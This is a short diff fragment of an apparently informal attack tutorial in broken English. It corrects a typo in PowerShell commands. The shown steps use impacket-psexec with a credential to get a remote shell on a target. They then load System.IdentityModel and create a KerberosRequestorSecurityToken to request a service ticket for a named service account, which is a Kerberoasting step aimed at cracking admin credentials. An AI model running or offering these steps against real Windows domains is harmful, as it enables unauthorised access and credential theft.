@@ -42,7 +42,7 @@ impacket-psexec `GROUPNAME/user:userpassword!@#@<targetIP>` powershell.exe
 
 enter this command esitize
 
-Add-Type -AssemblyName System.IdentifyModel 
+Add-Type -AssemblyName System.IdentityModel 
 
 now you need a ticket of who admin system you hack lets see
  
@@ -55,7 +55,7 @@ and go node info in left side now you copy the service info name
 
 now you enter the command 
 
-New-Object System.IdentifyModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<now you paste the server info name >"
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<now you paste the server info name >"
 
 now you get a ticket see this good job but this
 ticket save on target computer hard drive 
